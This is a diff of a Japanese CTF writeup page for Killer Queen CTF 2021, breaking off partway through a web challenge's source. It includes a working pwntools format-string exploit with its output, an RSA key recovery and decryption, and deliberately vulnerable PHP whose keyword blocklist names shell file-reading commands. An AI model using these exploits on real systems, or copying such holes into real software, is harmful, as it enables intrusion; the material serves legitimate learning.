@@ -16,14 +16,14 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 -- [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Can" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Cana" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/killerqueen_ctf_2021/" />
@@ -35,27 +35,23 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="Killer Queen CTF 2021 Writeup" />
-<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 -- [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Can" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Cana" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/killerqueen_ctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/killerqueen_ctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-11-01T19:00:00+09:00" />
 <meta property="article:modified_time" content="2021-11-01T19:00:00+09:00" />
 <meta itemprop="name" content="Killer Queen CTF 2021 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 -- [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Can">
-<meta itemprop="datePublished" content="2021-11-01T19:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-11-01T19:00:00&#43;09:00" />
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Cana"><meta itemprop="datePublished" content="2021-11-01T19:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-11-01T19:00:00+09:00" />
 <meta itemprop="wordCount" content="1010">
-
-
-
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Killer Queen CTF 2021 Writeup"/>
-<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 -- [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Can"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.killerqueenctf.org/ctfpage?page=challenges スコアボードが見れないので、最終順位はわかりません。 [Pwn]: Tweety Birb Challenge Pretty standard birb protection (nc 143.198.184.186 5002) Attachment: tweetybirb (ELF 64-bit) Solution タイトルからして、Cana"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -188,7 +184,7 @@
 <!--
 <img src="https://captureamerica.github.io/writeups/img/killerqueen_CTF_2021_Score2.png" alt="killerqueen_CTF_2021_Score2.png">
 -->
-<p><br /></p>
+<br />
 <p><br /><br /></p>
 <h2 id="pwn-tweety-birb">[Pwn]: Tweety Birb</h2>
 <hr>
@@ -200,7 +196,7 @@
 <ul>
 <li>tweetybirb (ELF 64-bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>タイトルからして、Canaryのチェックをバイパスするチャレンジっぽいですね。</p>
 <p>確かにCanaryは有効、PIEは無効です。</p>
@@ -211,11 +207,11 @@
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </pre>
-<p><br /></p>
+<br />
 <p>Ghidraでソースを確認します。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -246,44 +242,44 @@
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">72</span><span class="p">];</span>
-  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
-  
-  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span>
-      <span class="s">&#34;What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it</span><span class="se">\&#39;</span><span class="s">s not like you hacker can do anything. Anyways, what do you think of magpies?&#34;</span>
-      <span class="p">);</span>
-<span class="hl">  <span class="n">gets</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
-</span><span class="hl">  <span class="n">printf</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
-</span>  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">hmmm interesting. What about water fowl?&#34;</span><span class="p">);</span>
-<span class="hl">  <span class="n">gets</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
-</span>  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
-                    <span class="cm">/* WARNING: Subroutine does not return */</span>
-    <span class="n">__stack_chk_fail</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-
-<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /home/user/flag.txt&#34;</span><span class="p">);</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">72</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it</span><span class="se">\&#39;</span><span class="s">s not like you hacker can do anything. Anyways, what do you think of magpies?&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">hmmm interesting. What about water fowl?&#34;</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat /home/user/flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br /></p>
+<br />
 <p>なお、フラグは <code>kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}</code> だったので、おそらく想定解は、まずFSBでCanaryをLeakし、それを使って2回目のgets()でCanaryを上書きしつつBOFを起こす、みたいなことだと思います。</p>
-<p><br /></p>
+<br />
 <p>別解として、FSBでputs()をwin()に書き換えてやってもフラグは取れました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -301,25 +297,25 @@
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding:utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;143.198.184.186&#39;</span><span class="p">,</span> <span class="mi">5002</span><span class="p">)</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./tweetybirb&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-<span class="n">win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;win&#34;</span><span class="p">]</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">:</span> <span class="n">win_addr</span><span class="p">})</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; magpies?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-
-<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;143.198.184.186&#39;</span><span class="p">,</span> <span class="mi">5002</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./tweetybirb&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;win&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">:</span> <span class="n">win_addr</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; magpies?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>実行結果：</p>
 <pre>
 $ ./tweetybirb_solve.py
@@ -327,7 +323,7 @@ $ ./tweetybirb_solve.py
 b'   \x03   \x00   \x80aaaaba\x18@@kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}\n'
 [*] Closed connection to 143.198.184.186 port 5002
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -354,12 +350,12 @@ cXd4+r1ovhkBWmkBR5/lp/p2KQLspet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8
 WQIDAQAB
 -----END PUBLIC KEY-----
 </pre>
-<p><br /></p>
+<br />
 <p>mystery.txtの中身</p>
 <pre>
 Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==
 </pre>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>key.pubからPrivate keyを作成します。</p>
 <pre>
@@ -392,7 +388,7 @@ hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
 SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
 -----END RSA PRIVATE KEY-----
 </pre>
-<p><br /></p>
+<br />
 <p>mystery.txtは、一回 Base64 Decode しておいて、opensslコマンドを使って復号します。</p>
 <pre>
 $ cat mystery.txt | base64 -d > mystery2.txt
@@ -402,7 +398,7 @@ $ openssl rsautl -decrypt -inkey key.pri -in mystery2.txt -out secret-decrypted.
 $ cat secret-decrypted.txt
 kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -419,7 +415,7 @@ kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
 <p>中身：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -477,71 +473,71 @@ kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
 </span><span class="lnt">56
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="nx">session_start</span><span class="p">();</span>
-
-<span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
-    <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
-    <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$originalstring</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$originalstring</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;?&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fread&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;file_get_contents&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fgets&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;strings&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;less&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;more&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;head&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;tail&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;dd&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;cut&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;grep&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;tac&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;awk&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;sed&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="nv">$notetoadd</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;notewrite&#34;</span><span class="p">]))</span>
-<span class="p">{</span>
-    <span class="nv">$newnote</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;notewrite&#34;</span><span class="p">];</span>
-
-    <span class="c1">//3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)
-</span><span class="c1"></span>    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$newnote</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$notetoadd</span><span class="p">);</span>
-
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">generateRandomString</span><span class="p">();</span>
-    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;notes&#34;</span><span class="p">],</span> <span class="s2">&#34;</span><span class="si">$filename</span><span class="s2">.php&#34;</span><span class="p">);</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$filename</span><span class="s2">.php&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
-    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:index.php&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
